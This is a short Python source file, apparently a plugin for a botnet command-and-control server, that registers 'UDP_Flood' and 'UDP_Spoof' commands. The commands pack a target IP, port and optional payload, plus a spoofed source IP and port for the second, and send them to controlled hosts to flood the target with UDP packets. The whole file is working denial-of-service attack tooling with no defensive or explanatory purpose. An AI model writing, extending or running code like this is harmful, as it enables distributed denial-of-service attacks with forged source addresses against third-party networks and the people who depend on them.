from mount import Plugin

class Files(Plugin):
    __server_commands__ = {}
    __host_commands__ = {}

    def __init__(self):
        self.__host_commands__["UDP_Flood"] = self.udp_flood
        self.__host_commands__["UDP_Spoof"] = self.udp_spoof

    def udp_flood(self, host, args):
        """Floods target machine with UDP packets"""
        if len(args) < 2:
            print("Usage: UDP_Flood <target_ip> <target_port> [payload]")

        try:
            # IP:port:payload
            cmd = "%s:%s:%s" % (args[0], args[1], args[2])
        except IndexError:
            cmd = "%s:%s:Hi" % (args[0], args[1])

        host.send("00005")
        host.send("%03d" % len(cmd))
        host.send(cmd)

    def udp_spoof(self, host, args):
        """Floods target machine with UDP packets via spoofed ip & port"""
        if len(args) < 4:
            print("Usage: UDP_Spoof <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]")

        try:
            # IP:port:new_ip:new_port:payload
            cmd = "%s:%s:%s:%s:%s" % (args[0], args[1], args[2], args[3], args[4])
        except IndexError:
            cmd = "%s:%s:%s:%s:Hi" % (args[0], args[1], args[2], args[3])

        host.send("00006")
        host.send("%03d" % len(cmd))
        host.send(cmd)
